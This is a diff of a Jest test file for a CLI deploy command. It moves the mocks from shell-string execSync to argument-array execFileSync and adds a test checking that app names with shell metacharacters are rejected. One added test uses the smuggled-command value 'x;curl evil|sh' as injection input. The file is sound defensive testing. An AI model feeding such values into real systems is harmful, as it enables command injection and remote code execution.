@@ -1,7 +1,11 @@
 // src/commands/__tests__/deploy.test.js
 const fs = require('fs-extra');
 const path = require('path');
-const { execSync } = require('child_process');
+const { execFileSync } = require('child_process');
+
+// Helper: does an execFileSync(file, args) invocation include this token?
+const argvIncludes = (args, token) =>
+  Array.isArray(args) && args.some((a) => String(a).includes(token));
 const {
   deployCommand,
   verifyProjectStructure,
@@ -34,7 +38,7 @@ describe('Deploy Command', () => {
     fs.pathExists.mockResolvedValue(true);
     path.resolve.mockImplementation((...args) => args.join('/'));
     path.join.mockImplementation((...args) => args.join('/'));
-    execSync.mockImplementation(() => '');
+    execFileSync.mockImplementation(() => '');
   });
 
   describe('verifyProjectStructure', () => {
@@ -74,51 +78,55 @@ describe('Deploy Command', () => {
     };
 
     it('should successfully deploy development container', async () => {
-      execSync.mockImplementation((cmd) => {
-        if (cmd.includes('inspect')) return 'running';
+      execFileSync.mockImplementation((file, args) => {
+        if (argvIncludes(args, 'inspect')) return 'running';
         return '';
       });
 
       await expect(developmentDeploy(mockOptions)).resolves.not.toThrow();
-      expect(execSync).toHaveBeenCalledWith(
-        expect.stringContaining('docker build'),
+      expect(execFileSync).toHaveBeenCalledWith(
+        'docker',
+        expect.arrayContaining(['build']),
         expect.any(Object)
       );
-      expect(execSync).toHaveBeenCalledWith(
-        expect.stringContaining('docker run'),
+      expect(execFileSync).toHaveBeenCalledWith(
+        'docker',
+        expect.arrayContaining(['run']),
         expect.any(Object)
       );
     });
 
     it('should handle existing container cleanup', async () => {
-      execSync.mockImplementationOnce(() => { throw new Error(); }); // First stop fails
-      execSync.mockImplementation((cmd) => {
-        if (cmd.includes('inspect')) return 'running';
+      execFileSync.mockImplementationOnce(() => { throw new Error(); }); // First build call swallowed
+      execFileSync.mockImplementation((file, args) => {
+        if (argvIncludes(args, 'inspect')) return 'running';
         return '';
       });
 
       await expect(developmentDeploy(mockOptions)).resolves.not.toThrow();
-      expect(execSync).toHaveBeenCalledWith(
-        expect.stringContaining('docker stop'),
+      expect(execFileSync).toHaveBeenCalledWith(
+        'docker',
+        expect.arrayContaining(['stop']),
         expect.any(Object)
       );
     });
 
     it('should mount volumes correctly', async () => {
-      execSync.mockImplementation((cmd) => {
-        if (cmd.includes('inspect')) return 'running';
+      execFileSync.mockImplementation((file, args) => {
+        if (argvIncludes(args, 'inspect')) return 'running';
         return '';
       });
 
       await developmentDeploy(mockOptions);
-      expect(execSync).toHaveBeenCalledWith(
-        expect.stringContaining('-v'),
+      expect(execFileSync).toHaveBeenCalledWith(
+        'docker',
+        expect.arrayContaining(['-v']),
         expect.any(Object)
       );
     });
 
     it('should throw error on build failure', async () => {
-      execSync.mockImplementationOnce(() => { throw new Error('Build failed'); });
+      execFileSync.mockImplementationOnce(() => { throw new Error('Build failed'); });
       await expect(developmentDeploy(mockOptions)).rejects.toThrow('Build failed');
     });
   });
@@ -132,8 +140,8 @@ describe('Deploy Command', () => {
         port: 3000
       };
 
-      execSync.mockImplementation((cmd) => {
-        if (cmd.includes('inspect')) return 'running';
+      execFileSync.mockImplementation((file, args) => {
+        if (argvIncludes(args, 'inspect')) return 'running';
         return '';
       });
 
@@ -149,6 +157,19 @@ describe('Deploy Command', () => {
       };
 
       await expect(deployCommand(options)).rejects.toThrow('Production deployment not yet implemented');
+    });
+
+    it('should reject an app name with shell/path metacharacters', async () => {
+      const options = {
+        name: 'x;curl evil|sh',
+        type: 'shell',
+        env: 'development',
+        port: 3000,
+      };
+
+      await expect(deployCommand(options)).rejects.toThrow(/Invalid name/);
+      // No docker invocation should have happened for a rejected name.
+      expect(execFileSync).not.toHaveBeenCalled();
     });
 
     it('should throw error for unknown environment', async () => {
@@ -175,7 +196,7 @@ describe('Deploy Command', () => {
 
       const error = new Error('Deployment failed');
       error.stack = 'Error: Deployment failed\n  at test';
-      execSync.mockImplementation(() => {
+      execFileSync.mockImplementation(() => {
         throw error;
       });
 
@@ -195,7 +216,7 @@ describe('Deploy Command', () => {
         port: 3000
       };
 
-      execSync.mockImplementation(() => {
+      execFileSync.mockImplementation(() => {
         throw new Error('Deployment failed');
       });
 
@@ -230,9 +251,9 @@ describe('Deploy Command', () => {
         logs: true
       };
 
-      execSync.mockImplementation((cmd) => {
-        if (cmd.includes('inspect')) return 'running';
-        if (cmd.includes('logs -f')) return '';
+      execFileSync.mockImplementation((file, args) => {
+        if (argvIncludes(args, 'inspect')) return 'running';
+        if (argvIncludes(args, 'logs')) return '';
         return '';
       });
 
@@ -252,8 +273,8 @@ describe('Deploy Command', () => {
         return Promise.resolve(filePath.includes('package.json'));
       });
 
-      execSync.mockImplementation((cmd) => {
-        if (cmd.includes('inspect')) return 'running';
+      execFileSync.mockImplementation((file, args) => {
+        if (argvIncludes(args, 'inspect')) return 'running';
         return '';
       });
 
@@ -268,13 +289,13 @@ describe('Deploy Command', () => {
         port: 3000
       };
 
-      execSync.mockImplementation((cmd) => {
-        if (cmd.includes('docker build')) {
+      execFileSync.mockImplementation((file, args) => {
+        if (argvIncludes(args, 'build')) {
           const error = new Error('Build failed');
           error.message = 'Build failed';
           throw error;
         }
-        if (cmd.includes('inspect')) return 'running';
+        if (argvIncludes(args, 'inspect')) return 'running';
         return '';
       });
 
@@ -284,8 +305,8 @@ describe('Deploy Command', () => {
 
   describe('waitForContainer', () => {
     it('should return true when container is running immediately', async () => {
-      execSync.mockReturnValue('running\n');
-      
+      execFileSync.mockReturnValue('running\n');
+
       await expect(waitForContainer('test-container')).resolves.toBe(true);
     });
   });
